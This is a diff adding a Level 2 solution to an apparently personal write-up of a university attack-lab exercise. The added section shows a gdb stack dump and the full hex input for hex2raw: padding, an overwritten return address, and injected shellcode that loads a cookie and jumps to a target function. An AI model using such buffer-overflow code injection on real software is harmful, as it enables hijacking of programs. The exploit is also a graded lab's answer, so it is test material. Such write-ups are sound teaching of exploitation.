@@ -92,3 +92,35 @@ write the input it receives onto the stack, starting from its top
 Now if we pass to ~gets~ 40 bytes of zeros (or whatever values) + an
 address of 8 bytes, then we should fill the whole 40 bytes allocated
 by ~gets~ and overwrite ~0x0000000000401976~ with our new address.
+* Level 2
+One way to solve level 2 is to make the stack look like this right
+before ~getbuf~ execute its ~ret~ instruction:
+#+begin_src
+(gdb) x/6gz $rsp
+0x5561dca0:     0x000000005561dcb0      0x0000000000000000
+0x5561dcb0:     0x4859b997fac7c748      0xc3004017ec2404c7
+0x5561dcc0:     0xf4f4f4f4f4f4f400      0xf4f4f4f4f4f4f4f4
+#+end_src
+
+The top of the stack has been overwritten with the address of my
+shellcode (~0x000000005561dcb0~).
+
+This is the string I have passed to ~hex2raw~:
+#+begin_src
+00 00 00 00 00 00 00 00  /* 40 bytes of nothing */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+b0 dc 61 55 00 00 00 00 /* address of payload */
+00 00 00 00 00 00 00 00
+48 c7 c7 fa 97 b9 59    /* payload */
+48 c7 04 24 ec 17 40
+00
+c3
+
+/* 48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi */
+/* 48 c7 04 24 ec 17 40 	movq   $0x4017ec,(%rsp) */
+/* 00 */
+/* c3                   	ret */
+#+end_src
